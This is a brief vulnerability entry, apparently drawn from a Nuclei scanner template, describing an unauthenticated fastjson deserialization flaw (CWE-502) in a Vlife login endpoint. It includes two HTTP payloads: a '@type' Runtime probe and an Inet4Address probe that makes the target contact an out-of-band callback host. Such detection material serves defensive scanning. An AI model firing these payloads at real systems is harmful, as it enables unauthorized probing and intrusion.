# Vulnerability: Vlife FastJSON - Remote Code Execution
**Classification:** CWE-502
**Source:** Nuclei Template (`vlife-fastjson-rce.yaml`)

## Description
alibaba/fastjson v1.2.67 within the MyUsernamePasswordAuthenticationFilter for processing authentication requests. The /vlife/login endpoint directly deserializes the raw HTTP request body using JSON.parseObject() without enforcing type restrictions or enabling safe mode, allowing unauthenticated attackers to exploit known fastjson gadget chains for Remote Code Execution.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /vlife/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"@type":"java.lang.Runtime"}

POST /vlife/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"@type":"java.net.Inet4Address","val":"{{interactsh-url}}"}
```

